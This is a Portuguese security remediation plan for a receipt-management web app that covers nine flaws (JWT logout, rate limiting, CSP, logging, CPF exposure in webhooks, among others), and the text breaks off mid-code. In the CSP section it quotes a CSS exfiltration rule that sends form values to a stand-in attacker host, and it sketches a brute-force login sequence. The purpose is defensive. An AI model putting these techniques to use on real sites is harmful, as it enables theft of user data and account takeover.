# PLANEJAMENTO DE SEGURANÇA — ARAUJO PREV

> **Data:** 17/07/2026
> **Projeto:** Araujo Prev — Sistema de Gestão de Recibos
> **Versão do documento:** 1.0
> **Autor:** Auditoria de segurança automatizada
>
> **Objetivo:** Eliminar vulnerabilidades de segurança mantendo a praticidade do token JWT de 30 dias (protegendo o token em vez de encurtá-lo).

---

## ÍNDICE

1. [Falha #1 — Rate Limiter de Login Não Aplicado](#falha-1--rate-limiter-de-login-não-aplicado)
2. [Falha #2 — Logout Não Invalida o Token JWT](#falha-2--logout-não-invalida-o-token-jwt)
3. [Falha #3 — CSP com 'unsafe-inline' para Estilos](#falha-3--csp-com-unsafe-inline-para-estilos)
4. [Falha #4 — Authorization Header como Fallback](#falha-4--authorization-header-como-fallback)
5. [Falha #5 — console.log Vaza Dados Sensíveis (18 ocorrências)](#falha-5--consolelog-vaza-dados-sensíveis-18-ocorrências)
6. [Falha #6 — Error Handler Expõe Detalhes Internos](#falha-6--error-handler-expõe-detalhes-internos)
7. [Falha #7 — Webhook Expõe CPF em Payload e Logs](#falha-7--webhook-expõe-cpf-em-payload-e-logs)
8. [Falha #8 — Sem Auditoria de Login](#falha-8--sem-auditoria-de-login)
9. [Falha #9 — Sem Soft Delete para Clientes](#falha-9--sem-soft-delete-para-clientes)
10. [Ideias Extras da IA](#ideias-extras-da-ia)
11. [Cronograma de Implementação](#cronograma-de-implementação)

---

## FALHA #1 — Rate Limiter de Login Não Aplicado

### Severidade: 🔴 CRÍTICA

### Localização Exata

| Arquivo | Linha | Código |
|---------|-------|--------|
| `web/routes/auth.js` | 5 | `const { pgPool, jwt, JWT_SECRET, bcrypt } = deps;` |
| `web/routes/auth.js` | 43 | `app.post("/api/login", async (req, res) => {` |
| `web/server.js` | 186-192 | `const loginLimiter = rateLimit({ ... });` |
| `web/server.js` | 204-206 | `routeDeps = { ..., loginLimiter, mutationLimiter, ... }` |

### O que causa

O `loginLimiter` é **definido** em `server.js:186-192` e **passado nos deps** em `server.js:204-206`, mas **nunca é usado na rota**. A rota `POST /api/login` em `auth.js:43` não tem middleware de rate limiting.

**Impacto:** Um atacante pode testar senhas indefinidamente sem qualquer bloqueio.

**Cenário real de ataque:**

```
POST /api/login {"username": "admin", "password": "senha1"} → 401
POST /api/login {"username": "admin", "password": "senha2"} → 401
POST /api/login {"username": "admin", "password": "senha3"} → 401
... 10.000 tentativas em paralelo ...
POST /api/login {"username": "admin", "password": "senha123"} → 200
```

Um script simples testa ~50 senhas/segundo. Em 3 minutos testa as 10.000 senhas mais comuns do Brasil (123456, admin123, etc.). O bcrypt é lento, mas:

1. O atacante pode usar GPUs para acelerar
2. Pode paralelizar em múltiplas conexões simultâneas
3. Pode fazer ataques de dicionário direcionados (ex: senhas vazadas do e-mail do usuário)

### Como corrigir (2 minutos)

**Passo 1** — Em `web/routes/auth.js:5`, adicionar `loginLimiter` no destructure:

```js
const { pgPool, jwt, JWT_SECRET, bcrypt, loginLimiter } = deps;
```

**Passo 2** — Em `web/routes/auth.js:43`, aplicar o middleware na rota:

```js
app.post("/api/login", loginLimiter, async (req, res) => {
```

**Configuração atual do `loginLimiter` (já existe em `server.js:186-192`):**
- `windowMs: 15 * 60 * 1000` → janela de 15 minutos
- `max: 10` → máximo 10 tentativas por IP
- `standardHeaders: true` → headers `RateLimit-*` compatíveis com padrão
- `message: { erro: "Muitas tentativas de login. Aguarde 15 minutos." }`

**Resultado:** Após 10 tentativas erradas em 15 minutos, o IP é bloqueado. O ataque de força bruta para.

---

## FALHA #2 — Logout Não Invalida o Token JWT

### Severidade: 🔴 CRÍTICA

### Localização Exata

| Arquivo | Linha | Código |
|---------|-------|--------|
| `web/routes/auth.js` | 63-66 | `app.post("/api/logout", (req, res) => { res.clearCookie(...); res.json({ ok: true }); }` |
| `web/middleware/auth.js` | 7-18 | Função `auth` — só verifica JWT, não verifica se foi invalidado |
| `web/services/startup.js` | 177-198 | `CREATE TABLE IF NOT EXISTS users (id, username, password, role, ...)` — sem coluna `token_version` |

### Código atual do logout (`auth.js:63-66`)

```js
app.post("/api/logout", (req, res) => {
    res.clearCookie("token", { httpOnly: true, sameSite: "strict" });
    res.json({ ok: true });
});
```

### O que causa

`res.clearCookie()` **apenas remove o cookie do navegador do usuário**. O JWT em si continua assinado e válido por **30 dias completos**. Se o token foi roubado (via malware, interceptação de rede, ou acesso físico ao computador), ele continua funcionando mesmo após o logout.

**Cenário 1 — Computador compartilhado na recepção:**
1. Usuário "maria" faz login no computador da recepção
2. Maria sai para o almoço sem fazer logout
3. Um colega abre o devtools do navegador, copia o cookie `token`
4. Maria volta e faz logout — o cookie é limpo no navegador dela
5. O colega ainda tem o token copiado → acesso total por 30 dias

**Cenário 2 — Notebook da clínica é furtado:**
1. Notebook do financeiro é roubado
2. O administrador muda a senha do usuário
3. Mas o token JWT no notebook continua válido por 30 dias
4. O ladrão consegue acessar toda a API normalmente

**Cenário 3 — Token interceptado em rede não-HTTPS:**
1. (Improvável hoje porque o sistema força HTTPS, mas se houver um downgrade ataque...)
2. O token viaja em cada request como cookie
3. Se interceptado, vale por 30 dias

### Como corrigir — Abordagem `token_version` (30 minutos)

Esta é a abordagem mais limpa e eficiente. Não precisa de blacklist, não precisa de Redis, não precisa de tabela extra. Apenas um contador inteiro na tabela `users`.

**Fluxo conceitual:**
1. Todo usuário tem um `token_version` no banco (começa em 0)
2. No login, o `token_version` atual é incluído **dentro do JWT**
3. No middleware, após verificar a assinatura, **compara** o `token_version` do JWT com o do banco
4. No logout, **incrementa** o `token_version` no banco
5. O token antigo (com versão defasada) → rejeitado pelo middleware

**Isso significa que:**
- Quando o usuário faz logout, **todos os tokens existentes daquele usuário morrem instantaneamente**
- Mesmo que um token tenha 29 dias restantes, ele para de funcionar
- O usuário legítimo simplesmente faz login de novo (recebe token com versão nova)

#### Passo 1 — Migration: adicionar `token_version` na tabela users

Em `web/services/startup.js`, após a linha 197 (migração do `deleted_at`):

```js
await pgPool.query(`
  ALTER TABLE users ADD COLUMN IF NOT EXISTS token_version INTEGER NOT NULL DEFAULT 0
`);
```

#### Passo 2 — Incluir `token_version` no JWT durante o login

Em `web/routes/auth.js:52`, modificar o `jwt.sign()` para incluir `token_version`:

```js
// Antes (linha 52):
const token = jwt.sign(
  { id: user.id, username: user.username, role: user.role || "financeiro", escritorio: user.escritorio || "" },
  JWT_SECRET,
  { expiresIn: "30d" }
);

// Depois:
const token = jwt.sign(
  {
    id: user.id,
    username: user.username,
    role: user.role || "financeiro",
    escritorio: user.escritorio || "",
    token_version: user.token_version,  // <-- NOVO
  },
  JWT_SECRET,
  { expiresIn: "30d" }
);
```

#### Passo 3 — Validar `token_version` no middleware

Em `web/middleware/auth.js:7-18`, substituir a verificação atual:

```js
// ANTES (linhas 7-18):
async function auth(req, res, next) {
    const token = req.cookies?.token || (req.headers.authorization || "").split(" ")[1];
    if (!token) return res.status(401).json({ erro: "Não autorizado" });
    try {
      const payload = jwt.verify(token, JWT_SECRET);
      const { rows } = await pgPool.query("SELECT id FROM users WHERE id = $1", [payload.id]);
      if (!rows[0]) return res.status(401).json({ erro: "Sessão inválida, faça login novamente" });
      req.user = payload;
      next();
    } catch {
      res.status(401).json({ erro: "Sessão expirada, faça login novamente" });
    }
}

// DEPOIS:
async function auth(req, res, next) {
    const token = req.cookies?.token || (req.headers.authorization || "").split(" ")[1];
    if (!token) return res.status(401).json({ erro: "Não autorizado" });
    try {
      const payload = jwt.verify(token, JWT_SECRET);
      const { rows } = await pgPool.query(
        "SELECT id, token_version FROM users WHERE id = $1 AND deleted_at IS NULL",
        [payload.id]
      );
      if (!rows[0]) return res.status(401).json({ erro: "Sessão inválida, faça login novamente" });

      // VALIDAÇÃO NOVA: token_version diferente → token foi invalidado
      if (rows[0].token_version !== payload.token_version) {
        return res.status(401).json({ erro: "Sessão expirada, faça login novamente" });
      }

      req.user = payload;
      next();
    } catch {
      res.status(401).json({ erro: "Sessão expirada, faça login novamente" });
    }
}
```

#### Passo 4 — Incrementar `token_version` no logout

Em `web/routes/auth.js:63-66`, modificar o handler de logout:

```js
// ANTES:
app.post("/api/logout", (req, res) => {
    res.clearCookie("token", { httpOnly: true, sameSite: "strict" });
    res.json({ ok: true });
});

// DEPOIS:
app.post("/api/logout", deps.auth, async (req, res) => {
    // Invalida TODOS os tokens do usuário incrementando a versão
    await pgPool.query(
      "UPDATE users SET token_version = token_version + 1 WHERE id = $1",
      [req.user.id]
    );
    res.clearCookie("token", { httpOnly: true, sameSite: "strict" });
    res.json({ ok: true });
});
```

**Nota importante:** Adicionamos `deps.auth` como middleware no logout. Isso é necessário porque precisamos saber quem está fazendo logout (`req.user.id`). Antes não era necessário porque o logout só limpava o cookie.

### Exemplo completo do fluxo:

```
1. Maria faz login → token_version=0 no banco, JWT contém { token_version: 0 }
2. Maria acessa o sistema → middleware: banco.token_version(0) === JWT.token_version(0) ✅
3. Maria faz logout → banco: token_version = 1 (cookie é limpo)
4. Token antigo (token_version=0) tenta acessar → middleware: banco(1) !== JWT(0) → 401 ❌
5. Maria faz login de novo → token_version=1 no banco, novo JWT com { token_version: 1 }
6. Tudo normal até o próximo logout
```

### Considerações sobre performance

A validação do `token_version` adiciona **1 query extra** (`SELECT id, token_version FROM users WHERE ...`) em **cada request autenticado**.

- **Impacto estimado:** ~1-3ms por request (Neon é rápido, tabela users é pequena)
- **Cache possível:** cachear `token_version` em memória com TTL de 1 minuto (mas não é necessário para começar)
- **Alternativa sem query extra:** Usar Redis para armazenar versões ativas, mas adiciona complexidade desnecessária

---

## FALHA #3 — CSP com 'unsafe-inline' para Estilos

### Severidade: 🟡 MÉDIA

### Localização Exata

| Arquivo | Linha | Código |
|---------|-------|--------|
| `web/server.js` | 141 | `"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; "` |
| `web/public/index.html` | ~283 ocorrências | `style="..."` |

### O que causa

O header CSP tem `style-src 'self' 'unsafe-inline'`, que permite que **qualquer estilo inline** seja executado. Isso existe porque o `index.html` tem ~283 atributos `style="..."` espalhados.

**Impacto real:**
- `'unsafe-inline'` permite CSS injection: se um atacante conseguir injetar HTML no sistema (via XSS), ele pode modificar a aparência da página para engenharia social
- Técnica de "CSS exfiltration": `input[value^="123"] { background: url(https://atacante.com/123) }` pode vazar dados de formulários
- É uma violação da recomendação OWASP para Content Security Policy

**Atenuações atuais:**
- `script-src 'self'` bloqueia execução de JavaScript inline — reduz drasticamente o risco de XSS
- O sistema sanitiza inputs com `esc()` (escape HTML)
- `'unsafe-inline'` em style-src é considerado baixo risco comparado a script-src

**Por que ainda é importante remover:**
- Cada camada de segurança conta
- Se no futuro alguém adicionar `script-src 'unsafe-inline'` (mesmo temporariamente), o style-src desprotegido agrava o risco
- Boa prática de hardening progressivo

### Como corrigir (aproximadamente 2 horas)

**Passo 1** — Mapear todos os estilos inline para classes CSS

Cada `style="..."` único vira uma classe em `web/public/css/main.css`:

```css
/* Antes no HTML: */
<div style="color:var(--muted);font-size:12px;font-style:italic">Sem dados</div>

/* Depois no CSS: */
.text-muted-italic { color: var(--muted); font-size: 12px; font-style: italic; }

/* Depois no HTML: */
<div class="text-muted-italic">Sem dados</div>
```

**Passo 2** — Estilos mais comuns no index.html e suas classes sugeridas:

| Estilo inline | Classe CSS sugerida | Ocorrências |
|---|---|---|
| `color:var(--muted);font-size:12px;font-style:italic` | `.text-muted-italic` | ~15 |
| `font-weight:bold` | `.fw-bold` | ~20 |
| `text-align:center` | `.text-center` | ~18 |
| `margin-top:10px` | `.mt-10` | ~12 |
| `display:flex` | `.d-flex` | ~10 |
| `gap:8px` | `.gap-8` | ~8 |
| `cursor:pointer` | `.cursor-pointer` | ~15 |
| `white-space:nowrap` | `.text-nowrap` | ~6 |
| Outros únicos | Classes específicas | ~179 |

**Passo 3** — Remover `'unsafe-inline'` do CSP em `server.js:141`:

```js
"style-src 'self' https://fonts.googleapis.com https://cdn.jsdelivr.net; "
```

**Estratégia sugerida:** Fazer em blocos de 50 estilos por vez, testando a interface após cada bloco. O frontend já usa classes existentes em muitos lugares — é provável que vários estilos inline sejam redundantes ou possam ser substituídos por classes já existentes.

---

## FALHA #4 — Authorization Header como Fallback

### Severidade: 🟡 MÉDIA

### Localização Exata

| Arquivo | Linha | Código |
|---------|-------|--------|
| `web/middleware/auth.js` | 8 | `const token = req.cookies?.token || (req.headers.authorization || "").split(" ")[1];` |

### O que causa

O middleware aceita o token de autenticação por **duas portas diferentes**:

1. **Cookie httpOnly** (seguro — JS não consegue ler)
2. **Header `Authorization: Bearer <token>`** (inseguro — JS consegue setar)

**O problema fundamental:**
- Cookie `httpOnly` é imune a XSS porque `document.cookie` não enxerga cookies `httpOnly`
- Header `Authorization` pode ser setado por qualquer JavaScript rodando na página

**Cenário de ataque:**
1. Um XSS é descoberto em qualquer endpoint (mesmo que sanitizado, pode haver uma brecha futura)
2. O atacante executa: `fetch("/api/recibos", { headers: { "Authorization": "Bearer <token_roubado>" } })`
3. O token vazado pode ser o do próprio usuário logado, obtido via outro meio
4. O atacante consegue persistência mesmo após o cookie ser limpo

**Além disso:** aceitar `Authorization` header significa que o token pode ser armazenado em `localStorage` ou `sessionStorage` por um cliente mal escrito, o que é uma prática proibida pelo OWASP.

### Como corrigir (5 minutos)

**Cenário A — Sem clientes externos usando a API via Bearer:**

Em `web/middleware/auth.js:8`, aceitar **apenas cookie**:

```js
const token = req.cookies?.token;
if (!token) return res.status(401).json({ erro: "Não autorizado" });
```

**Cenário B — Com clientes externos legítimos:**

Se existem integrações que usam `Authorization: Bearer` (ex: script de importação, webhook externo, ferramenta de BI), a abordagem correta é:

1. Manter o middleware aceitando ambos (cookie + Bearer)
2. **Ou** criar tokens de API separados para clientes externos (com escopo reduzido e expiração longa)
3. **Ou** usar uma rota `/api/auth/token` que gera tokens específicos para API

**Verificação necessária:** Buscar no código se existe algum cliente usando `Authorization: Bearer`:

```bash
grep -r "Authorization" web/ --include="*.js" --include="*.html"
```

---

## FALHA #5 — console.log Vaza Dados Sensíveis (18 ocorrências)

### Severidade: 🟡 MÉDIA

### Localização Exata

**Em `web/routes/recibos.js` (18 ocorrências):**

| Linha | Código | Dados vazados |
|-------|--------|---------------|
| 64 | `console.log(\`Webhook disparado para ${url} ...\`)` | URL do webhook, status |
| 67 | `console.warn(\`Webhook retornou status ${resp.status} ... ${url} ...\`)` | URL do webhook |
| 69 | `console.warn(\`Webhook falhou: ${e.message} ... ${url} ...\`)` | URL do webhook, erro |
| 76 | `console.error(\`Webhook permanentemente falhou... ${url} ... ${dadosRecibo.num}\`)` | URL, número do recibo |
| 184 | `console.error("Erro sheets (ignorado):", e)` | Erro interno |
| 185 | `console.error("Erro webhook (ignorado):", e)` | Erro interno |
| 209 | `console.error("Erro ao auto-marcar parcela:", e.message)` | Erro interno |
| 213 | `console.error("Erro em POST /api/recibos:", err)` | Erro interno |
| 282 | `console.error("Erro ao desfazer exclusão:", e.message)` | Erro interno |
| 300 | `console.error("Erro ao salvar assinatura:", err)` | Erro interno |
| 317 | `console.error("Erro ao atualizar comprovante:", err)` | Erro interno |
| 362 | `console.error("Erro ao criar recibo recorrente:", e.message)` | Erro interno |
| 408 | `console.error("Erro archiver:", e.message)` | Erro interno |
| 419 | `console.error(\`Erro ao gerar PDF do recibo ${id}: ${e.message}\`)` | ID do recibo |
| 425 | `console.error("Erro ao exportar ZIP:", e.message)` | Erro interno |
| 443 | `console.error("Erro no status da exportação:", e.message)` | Erro interno |
| 622 | `console.error("Erro ao gerar recibo:", e.message)` | Erro interno |
| 661 | `console.error("Erro no batch email:", err)` | Erro interno |

**Em `web/routes/clientes.js` (10 ocorrências):**

| Linha | Código | Dados vazados |
|-------|--------|---------------|
| 23 | `console.error("Erro ao buscar cliente por CPF:", e.message)` | Erro interno |
| 56 | `console.error("Erro ao buscar cliente:", e.message)` | Erro interno |
| 144 | `console.error("Erro ao criar cliente:", e.message)` | Erro interno |
| 221 | `console.error("Erro ao atualizar cliente:", e.message)` | Erro interno |
| 234 | `console.error("Erro ao atualizar auto-recibo:", e.message)` | Erro interno |
| 250 | `console.error("Erro ao excluir cliente:", e.message)` | Erro interno |
| 273 | `console.error("Erro ao salvar observação:", e.message)` | Erro interno |
| 292 | `console.error("Erro ao remover observação:", e.message)` | Erro interno |
| 319 | `console.error("Erro ao registrar lembrete:", e.message)` | Erro interno |
| 358 | `console.error("Erro ao atualizar parcela:", e.message)` | Erro interno |

### O que causa

O serviço `logger` já existe em `web/services/logger.js` e é usado em `server.js` e `startup.js`, mas as rotas (`recibos.js` e `clientes.js`) ignoram ele e usam `console.log/warn/error` diretamente.

**Problemas específicos:**

1. **Sem formatação consistente** — Logs do `console.log` são textos puros sem timestamp padronizado, sem nível, sem estrutura. Logs do `logger` têm timestamp ISO + nível + mensagem formatada.

2. **Sem controle de nível** — `console.log` é sempre "info". Não dá para filtrar por severidade. Não dá para suprimir logs de debug em produção.

3. **Vazamento de informação sensível**:
   - URL do webhook (linha 64): a URL pode conter chave secreta ou token (`https://hooks.example.com/secret-key-123`)
   - ID do recibo (linha 419): exposto no log
   - Mensagens de erro internas podem revelar estrutura do banco, caminhos de arquivo, etc.

4. **Sem destino configurável** — `console.log` vai para stdout/stderr. O `logger` pode ser configurado para enviar para arquivo, CloudWatch, ou outro destino. Se amanhã quiserem logs centralizados, precisam trocar 30+ `console.log`.

### Como corrigir (15 minutos)

**Passo 1** — Adicionar `logger` nos `routeDeps` em `web/server.js:204`:

```js
const routeDeps = {
  auth, adminOnly, financeiroOnly, semRecepcao, semPrecatorios,
  pgPool, jwt, JWT_SECRET, bcrypt, loginLimiter, mutationLimiter,
  logger,  // <-- NOVO
  ...
};
```

**Passo 2** — Em `web/routes/recibos.js`, adicionar `logger` no destructure da função e substituir cada `console.*`:

```js
// ANTES (linha 64):
console.log(`[${new Date().toISOString()}] ✅ Webhook disparado para ${url} (status ${resp.status}, tentativa ${tentativa})`);

// DEPOIS:
deps.logger.info(`Webhook disparado (status ${resp.status}, tentativa ${tentativa})`);
```

```js
// ANTES (linha 76):
console.error(`[${new Date().toISOString()}] ❌ Webhook permanentemente falhou após ${MAX_TENTATIVAS} tentativas para ${url} (recibo: ${dadosRecibo.num})`);

// DEPOIS:
deps.logger.warn(`Webhook permanentemente falhou após ${MAX_TENTATIVAS} tentativas (recibo: ${dadosRecibo.num})`);
```

```js
// ANTES (linha 184):
registrarNoSheets({ ... }).catch(e => console.error("Erro sheets (ignorado):", e));
// DEPOIS:
registrarNoSheets({ ... }).catch(e => deps.logger.warn(`Erro sheets (ignorado): ${e.message}`));
```

**Passo 3** — Repetir para todas as 28 ocorrências (18 em recibos.js + 10 em clientes.js), seguindo estas regras:

| `console.*` original | Substituir por | Quando usar |
|---|---|---|
| `console.log(...)` | `deps.logger.info(...)` | Operação bem-sucedida |
| `console.warn(...)` | `deps.logger.warn(...)` | Operação falhou mas não quebrou o fluxo |
| `console.error(...)` | `deps.logger.error(...)` | Operação falhou e afetou o resultado |
| `console.error("...", err)` | `deps.logger.error("...:", err.message)` | Não logar o objeto de erro inteiro |

**Padrão para erros ignorados (catch sem impacto):**

```js
// ANTES:
.catch(e => console.error("Erro sheets (ignorado):", e));

// DEPOIS:
.catch(e => deps.logger.warn(`Sheets ignorado: ${e.message}`));
```

---

## FALHA #6 — Error Handler Expõe Detalhes Internos

### Severidade: 🟢 BAIXA

### Localização Exata

| Arquivo | Linha | Código |
|---------|-------|--------|
| `web/server.js` | 253-254 | `if (err.name === "MulterError" \|\| err.message?.startsWith("Tipo de arquivo")) { return res.status(400).json({ erro: err.message }); }` |

### Código atual:

```js
if (err.name === "MulterError" || err.message?.startsWith("Tipo de arquivo")) {
    return res.status(400).json({ erro: err.message });
}
```

### O que causa

O servidor retorna `err.message` diretamente para o cliente. Embora no momento isso retorne mensagens inofensivas como `"Tipo de arquivo não permitido"`, **qualquer mudança futura** na mensagem de erro pode expor detalhes internos:

- Caminhos do servidor: `/var/app/current/web/public/uploads/...`
- Nomes de arquivos internos: `recibo_gerado_em_17-07-2026_10h30.pdf`
- Informações de configuração do multer

**Cenário:** Um desenvolvedor no futuro modifica o MulterError para incluir mais detalhes, e sem perceber, esses detalhes passam a ser retornados ao cliente.

### Como corrigir (5 minutos)

```js
if (err.name === "MulterError" || err.message?.startsWith("Tipo de arquivo")) {
    return res.status(400).json({ erro: "Arquivo inválido. Use JPEG, PNG, WebP, GIF, PDF ou XML." });
}
```

A mensagem de erro deve ser **genérica e fixa**, nunca dinâmica baseada no erro interno.

---

## FALHA #7 — Webhook Expõe CPF em Payload e Logs

### Severidade: 🟡 MÉDIA

### Localização Exata

| Arquivo | Linha | Código |
|---------|-------|--------|
| `web/routes/recibos.js` | 39-53 | Função `dispararWebhook` — monta payload com CPF |
| `web/routes/recibos.js` | 64, 67, 69, 76 | Logs com URL do webhook |

### Código do payload (aproximado):

```js
const payload = JSON.stringify({
    evento: "recibo_gerado",
    recibo: {
        num, nome, cpf,     // <-- CPF completo
        valor, data, forma_pagamento, escritorio, emitido_por, referencia
    },
    timestamp: new Date().toISOString(),
});
```

Headers do webhook:
```js
headers: {
    "Content-Type": "application/json",
    "User-Agent": "AraujoPrev-Webhook/1.0",
}
```

### O que causa

1. **CPF completo sendo enviado** para uma URL externa configurável via `process.env.WEBHOOK_URL`
2. **Sem autenticação** na chamada — a URL funciona como "senha" (algo que não é recomendado pelo OWASP)
3. **Logs contêm a URL completa** — se a URL tiver uma query string com chave, ela vaza nos logs
4. **Sem criptografia adicional** — a comunicação depende exclusivamente de HTTPS

**Cenário:** Se a URL do webhook for comprometida (vazada em log, descoberta em código-fonte, ou o endpoint externo for hackeado), CPFs de todos os clientes que geraram recibos são expostos. Violação da LGPD.

### Como corrigir (15 minutos)

**Opção A — Mascarar CPF no payload (recomendado):**

```js
const cpfMascarado = dadosRecibo.cpf.replace(/^(\d{3})\d{6}(\d{2})$/, "$1******$2");
// "123.456.789-00" → "123.******-00"

const payload = JSON.stringify({
    evento: "recibo_gerado",
    recibo: {
        num: dadosRecibo.num,
        nome: dadosRecibo.nome,
        cpf: cpfMascarado,   // <-- MASCARADO
        valor: dadosRecibo.valor,
        data: dadosRecibo.data,
        forma_pagamento: dadosRecibo.forma_pagamento,
        escritorio: dadosRecibo.escritorio,
        emitido_por: dadosRecibo.emitido_por,
        referencia: dadosRecibo.referencia,
    },
    timestamp: new Date().toISOString(),
});
```

**Opção B — Adicionar autenticação no header:**

```js
const headers = {
    "Content-Type": "application/json",
    "User-Agent": "AraujoPrev-Webhook/1.0",
};
if (process.env.WEBHOOK_SECRET) {
    headers["Authorization"] = `Bearer ${process.env.WEBHOOK_SECRET}`;
}
```

**Opção C — (Combinada) Mascarar + Autenticação:**

Fazer ambas as opções acima. O webhook recebe CPF mascarado (suficiente para identificar o cliente sem expor o número completo) e a chamada é autenticada com token.

**Opção D — Não enviar CPF (se o webhook não precisar):**

```js
recibo: {
    num: dadosRecibo.num,
    nome: dadosRecibo.nome,
    valor: dadosRecibo.valor,
    data: dadosRecibo.data,
    // cpf removido propositalmente
}
```

---

## FALHA #8 — Sem Auditoria de Login

### Severidade: 🟢 BAIXA

### Localização Exata

| Arquivo | Linha | Código |
|---------|-------|--------|
| `web/routes/auth.js` | 43-61 | Handler `POST /api/login` — não chama `registrarAuditoria` |

### O que causa

Quando um login bem-sucedido acontece, **nada é registrado**. Não há:
- Quem fez login
- Quando fez
- De qual IP
- Se foi um login suspeito (fora do horário, de IP diferente do habitual)

**Em caso de invasão:**
- Não é possível rastrear quando o atacante começou
- Não é possível identificar qual conta foi comprometida
- Não é possível notificar o usuário afetado
- Não é possível gerar evidências para análise forense

**A função `registrarAuditoria` já existe** em `server.js:170-183` e é usada em outras rotas (admin, recibos). Só não é chamada no login.

### Como corrigir (20 minutos)

Em `web/routes/auth.js:52-59`, após o token ser gerado, adicionar:

```js
const token = jwt.sign({ ... }, JWT_SECRET, { expiresIn: "30d" });

// NOVO: Registrar auditoria de login
try {
    await pgPool.query(
        `INSERT INTO auditoria (id, ts, usuario, role, acao, entidade_id, dados)
         VALUES (gen_random_uuid()::text, $1, $2, $3, 'login', $4, $5)`,
        [
            new Date().toISOString(),
            user.username,
            user.role || "financeiro",
            user.id,
            JSON.stringify({
                ip: req.ip || req.connection?.remoteAddress || req.headers["x-forwarded-for"] || ""
            })
        ]
    );
} catch (e) {
    // NUNCA bloquear o login por falha na auditoria
    logger.error("Falha ao registrar auditoria de login:", e.message);
}
```

**Informações registradas:**
- `ts`: timestamp ISO do login
- `usuario`: nome de usuário
- `role`: papel (financeiro, recepcao, admin)
- `entidade_id`: ID do usuário no banco
- `dados`: IP de origem (formato JSON)

---

## FALHA #9 — Sem Soft Delete para Clientes

### Severidade: 🟢 BAIXA

### Localização Exata

| Arquivo | Linha | Código |
|---------|-------|--------|
| `web/routes/clientes.js` | ~250 | Handler `DELETE /api/clientes/:id` |
| `web/services/startup.js` | (fora da tela) | Coluna `deletado_em` não existe na tabela clientes |

### O que causa

Os recibos já têm soft delete implementado (colunas `deletado_em`, `deletado_por`, janela de desfazer via `POST /api/recibos/:id/restaurar`). **Os clientes não.**

Quando um cliente é excluído:
- A remoção é **permanente** e irreversível
- Não há janela de desfazer (como existe para recibos)
- Se foi um erro (excluiu o cliente errado), os dados perdidos podem ser significativos (histórico de recibos, parcelas, observações)
- **Inconsistência** com o comportamento dos recibos

### Como corrigir (40 minutos)

**Passo 1** — Adicionar colunas de soft delete na tabela `clientes` em `startup.js`:

```js
await pgPool.query(`
  ALTER TABLE clientes ADD COLUMN IF NOT EXISTS deletado_em TEXT DEFAULT NULL
`);
await pgPool.query(`
  ALTER TABLE clientes ADD COLUMN IF NOT EXISTS deletado_por TEXT DEFAULT ''
`);
```

**Passo 2** — Modificar a rota de exclusão em `web/routes/clientes.js`:

```js
// ANTES (aproximadamente linha 250):
app.delete("/api/clientes/:id", deps.auth, async (req, res) => {
    // ... exclusão permanente
    await remove(deps.dbClientes, { _id: id });
    res.json({ ok: true });
});

// DEPOIS:
app.delete("/api/clientes/:id", deps.auth, async (req, res) => {
    const { findOne, update } = deps;
    const cliente = await findOne(deps.dbClientes, { _id: id });
    if (!cliente) return res.status(404).json({ erro: "Cliente não encontrado" });

    // Soft delete: marca como deletado
    await update(deps.dbClientes, { _id: id }, {
        deletado_em: new Date().toISOString(),
        deletado_por: req.user?.username || "sistema",
    });

    res.json({ ok: true, message: "Cliente movido para lixeira. Use restaurar em até 30 dias." });
});
```

**Passo 3** — Adicionar endpoint de restauração:

```js
// NOVO endpoint:
app.post("/api/clientes/:id/restaurar", deps.auth, async (req, res) => {
    const { findOne, update } = deps;
    const cliente = await findOne(deps.dbClientes, { _id: id });
    if (!cliente) return res.status(404).json({ erro: "Cliente não encontrado" });
    if (!cliente.deletado_em) return res.status(400).json({ erro: "Cliente não está na lixeira" });

    // Verificar janela de 30 dias
    const dataExclusao = new Date(cliente.deletado_em);
    const diasDesdeExclusao = (Date.now() - dataExclusao.getTime()) / 86400000;
    if (diasDesdeExclusao > 30) {
        return res.status(400).json({ erro: "Prazo de 30 dias para restaurar expirou" });
    }

    await update(deps.dbClientes, { _id: id }, {
        deletado_em: null,
        deletado_por: "",
    });

    res.json({ ok: true, message: "Cliente restaurado com sucesso." });
});
```

**Passo 4** — Atualizar consultas de listagem para ignorar clientes deletados:

Em `web/routes/clientes.js`, nas rotas de listagem:

```js
// ANTES:
const clientes = await find(deps.dbClientes, {});

// DEPOIS:
const clientes = await find(deps.dbClientes, { deletado_em: null });
```

**Observação:** A estrutura atual de dados usa `NeDB` (banco de arquivos), não PostgreSQL diretamente para clientes. As queries usam `find`, `findOne`, `update`, `remove` do `services/database.js`. A lógica de soft delete precisa ser compatível com essa camada.

---

## IDEIAS EXTRAS DA IA

Além das 9 falhas documentadas acima, estas são melhorias adicionais que elevariam a postura de segurança:

### Ideia 1 — Notificação de login de IP desconhecido

Quando um login bem-sucedido vier de um IP diferente dos últimos 5 logins do mesmo usuário, disparar uma notificação:
- No próprio sistema (popup "Novo login detectado da cidade X")
- Opcionalmente por e-mail/WhatsApp

```js
// Fluxo sugerido:
// 1. Buscar últimos 5 IPs de login do usuário na auditoria
// 2. Se IP atual não está na lista, marcar como "login suspeito"
// 3. Na resposta do login, incluir flag "novo_dispositivo: true"
// 4. Frontend exibe aviso: "Login de novo dispositivo. Se não foi você, troque a senha."
```

### Ideia 2 — Botão "Forçar logout de todos os dispositivos"

No painel admin, um botão que executa:

```sql
UPDATE users SET token_version = token_version + 1;
```

Isso invalida **todos os tokens de todos os usuários instantaneamente**. Útil em caso de:
- Suspeita de invasão generalizada
- Vazamento do `JWT_SECRET`
- Troca de senha do admin

### Ideia 3 — Rotação automática do `JWT_SECRET`

Um cron mensal que:
1. Gera um novo `JWT_SECRET`
2. Armazena o anterior como backup (para tokens emitidos antes da rotação)
3. Invalida todos os tokens

Isso garante que mesmo que o `JWT_SECRET` vaze, ele só é válido por no máximo 1 mês.

**Cuidado:** Isso força todos os usuários a logar de novo uma vez por mês. Pode ser inconveniente.

### Ideia 4 — Rate limiter por usuário (além do rate limiter por IP)

O rate limiter atual bloqueia por IP (`express-rate-limit`). Um atacante pode contornar usando uma botnet com milhares de IPs.

Para ataques mais sofisticados, implementar rate limit **por username**:

```sql
-- Tabela auxiliar:
CREATE TABLE IF NOT EXISTS login_attempts (
    username TEXT NOT NULL,
    ip TEXT NOT NULL,
    attempted_at TIMESTAMPTZ DEFAULT NOW()
);

-- Consulta para verificar:
SELECT COUNT(*) FROM login_attempts
WHERE username = $1
AND attempted_at > NOW() - INTERVAL '15 minutes';
```

```js
// Middleware adicional:
async function loginRateByUser(req, res, next) {
